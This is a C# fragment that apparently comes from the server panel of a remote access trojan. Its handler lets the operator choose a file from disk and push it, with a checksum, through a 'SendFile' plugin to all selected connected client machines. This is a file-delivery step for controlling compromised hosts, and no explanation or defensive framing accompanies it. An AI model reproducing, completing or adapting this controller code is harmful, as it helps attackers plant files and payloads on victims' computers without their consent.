	private void fromDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string checksum2 = Methods.GetChecksum(openFileDialog.FileName);
		byte[] pack = LEB128.Write(new object[3] { "SendDiskGet", openFileDialog.FileName, checksum2 });
		string checksum3 = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum3, pack });
			});
		}
	}

